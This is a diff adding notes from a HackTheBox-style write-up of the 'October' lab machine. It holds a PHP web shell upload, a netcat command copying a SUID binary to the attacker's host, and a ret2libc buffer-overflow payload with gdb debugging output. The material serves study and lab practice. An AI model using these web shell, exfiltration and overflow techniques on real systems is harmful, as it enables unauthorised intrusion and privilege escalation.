@@ -28,4 +28,146 @@ gobuster dir -u http://10.10.10.16 -w /usr/share/wordlists/directory-list-2.3-me
 We proceed to admin portal at http://10.10.10.16/backend/auth and try the default creds, admin:admin and we are logged in.
 Now we create a simple php shell <?php system($_GET['cmd']);?> as shell.php5, upload it and see if we get a reverse shell.
 And sure enough visiting : http://10.10.10.16/storage/app/media/shell.php5?cmd=id gives : uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Trying to send call other reverse shells do not work so I end up uploading the php reverse shell with a php5 extension.
+We get the reverse shell and access to user flag!
+http://10.10.10.16/storage/app/media/shell1.php5
+www-data@october:/home/harry$ cat user.txt
+cat user.txt
+29161ca87aa3d34929dc46efc40c89c0
+Running LinEnum.sh and checking SUID files, we note one that is a little weird:
+-rwsr-xr-x 1 root root 7377 Apr 21  2017 /usr/local/bin/ovrflw
+And so we download it for further analysis.
+Sender machine : nc 10.10.14.13 1234 < /usr/local/bin/ovrflw
+Receiver machine : nc -lvnp 1234 > ovrflw
+=============Priv Escalation==============
+The binary is an elf : file ovrflw => ovrflw: ELF 32-bit LSB executable. We go ahead and check for any vulnerable functions.
+We have strcpy => strings ovrflw 
+/lib/ld-linux.so.2
+libc.so.6
+_IO_stdin_used
+strcpy
+exit
+printf
+We make the binary executable and send a bunch of A's to see if we get a segmentation fault.
+chmod +x ovrflw
+./ovrflw AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+200 A's give the segmentation fault.
+
+We now need to develop our buffer overflow exploit:
+----------------
+offset 112
+system 0xb7596310
+exit 0xb7589260
+/bin/sh 0xb76b8bac
+
+"A"*offset + "system + exit + /bin/sh" {little endian}
+
+"A"*112 + "\x10\x63\x59\xb7\x60\x92\x58\xb7\xac\x8b\x6b\xb7"
+brute force to bypass ASLR
+-----------------------------
+/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 200
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -q 64413764
+[*] Exact match at offset 112
+++++++++++++++++++++++++++++++++++++++++On local system++++++++++++++++
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : disabled
+RELRO     : Partial
+gdb-peda$ b main
+Breakpoint 1 at 0x8048480
+gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+Starting program: /home/joe/Downloads/htb/oscp/linux/october/ovrflw Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+[----------------------------------registers-----------------------------------]
+EAX: 0xf7fabae8 --> 0xffffd500 --> 0xffffd747 ("SHELL=/bin/bash")
+EBX: 0x0 
+ECX: 0x82626212 
+EDX: 0xffffd484 --> 0x0 
+ESI: 0xf7fa9000 --> 0x1e4d6c 
+EDI: 0xf7fa9000 --> 0x1e4d6c 
+EBP: 0xffffd448 --> 0x0 
+ESP: 0xffffd448 --> 0x0 
+EIP: 0x8048480 (<main+3>:	and    esp,0xfffffff0)
+EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x8048478 <frame_dummy+40>:	jmp    0x80483f0 <register_tm_clones>
+   0x804847d <main>:	push   ebp
+   0x804847e <main+1>:	mov    ebp,esp
+=> 0x8048480 <main+3>:	and    esp,0xfffffff0
+   0x8048483 <main+6>:	add    esp,0xffffff80
+   0x8048486 <main+9>:	cmp    DWORD PTR [ebp+0x8],0x1
+   0x804848a <main+13>:	jg     0x80484ad <main+48>
+   0x804848c <main+15>:	mov    eax,DWORD PTR [ebp+0xc]
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd448 --> 0x0 
+0004| 0xffffd44c --> 0xf7de2e46 (<__libc_start_main+262>:	add    esp,0x10)
+0008| 0xffffd450 --> 0x2 
+0012| 0xffffd454 --> 0xffffd4f4 --> 0xffffd64c ("/home/joe/Downloads/htb/oscp/linux/october/ovrflw")
+0016| 0xffffd458 --> 0xffffd500 --> 0xffffd747 ("SHELL=/bin/bash")
+0020| 0xffffd45c --> 0xffffd484 --> 0x0 
+0024| 0xffffd460 --> 0xffffd494 --> 0xc1913c02 
+0028| 0xffffd464 --> 0xf7ffdb40 --> 0xf7ffdae0 --> 0xf7fcb3e0 --> 0xf7ffd980 --> 0x0 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 1, 0x08048480 in main ()
+gdb-peda$ c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+EAX: 0x0 
+EBX: 0x0 
+ECX: 0xffffd740 ("4Ag5Ag")
+EDX: 0xffffd49e ("4Ag5Ag")
+ESI: 0xf7fa9000 --> 0x1e4d6c 
+EDI: 0xf7fa9000 --> 0x1e4d6c 
+EBP: 0x41366441 ('Ad6A')
+ESP: 0xffffd450 ("8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+EIP: 0x64413764 ('d7Ad')
+EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+Invalid $PC address: 0x64413764
+[------------------------------------stack-------------------------------------]
+0000| 0xffffd450 ("8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0004| 0xffffd454 ("Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0008| 0xffffd458 ("e1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0012| 0xffffd45c ("2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0016| 0xffffd460 ("Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0020| 0xffffd464 ("e5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0024| 0xffffd468 ("6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+0028| 0xffffd46c ("Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag")
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x64413764 in ?? ()
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+On Server
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+(gdb) b main
+b main
+Breakpoint 1 at 0x8048480
+(gdb) r
+r
+Starting program: /usr/local/bin/ovrflw 
+
+Breakpoint 1, 0x08048480 in main ()
+(gdb) p system
+p system
+$1 = {<text variable, no debug info>} 0xb7596310 <__libc_system>
+(gdb) p exit
+p exit
+$2 = {<text variable, no debug info>} 0xb7589260 <__GI_exit>
+(gdb) find 0xb7596310, +9999999, "/bin/sh"
+find 0xb7596310, +9999999, "/bin/sh"
+0xb76b8bac
+warning: Unable to access 16000 bytes of target memory at 0xb7702f34, halting search.
+1 pattern found
++++++++++++++++++++++++++++++++++++++++++++++++++++++
++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+
 
